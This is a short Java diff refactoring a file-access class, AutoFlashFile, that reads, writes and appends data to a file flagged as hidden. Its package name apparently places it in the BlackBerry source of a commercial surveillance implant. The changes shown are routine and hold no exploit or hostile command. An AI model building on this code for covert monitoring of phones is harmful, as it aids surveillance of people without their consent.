@@ -20,17 +20,17 @@ import com.ht.rcs.blackberry.utils.Check;
 import com.ht.rcs.blackberry.utils.Utils;
 
 public class AutoFlashFile {
-    private String filename;
-    FileConnection fconn;
-    DataInputStream is;
-    OutputStream os;
-
+    String filename;
     boolean hidden;
     boolean autoclose;
+    
+    private FileConnection fconn;
+    private DataInputStream is;
+    private OutputStream os;
 
-    public AutoFlashFile(String filename, boolean hidden) {
-        this.filename = filename;
-        this.hidden = hidden;
+    public AutoFlashFile(String filename_, boolean hidden_) {
+        this.filename = filename_;
+        this.hidden = hidden_;
     }
 
     public synchronized boolean append(byte[] message) {
@@ -148,7 +148,6 @@ public class AutoFlashFile {
 
     public synchronized byte[] read() {
         byte[] data = null;
-        FileConnection fconn = null;
 
         try {
             fconn = (FileConnection) Connector.open(filename, Connector.READ);
@@ -166,7 +165,6 @@ public class AutoFlashFile {
     }
 
     public synchronized boolean write(byte[] message) {
-        FileConnection fconn = null;
 
         try {
             fconn = (FileConnection) Connector.open(filename, Connector.WRITE);
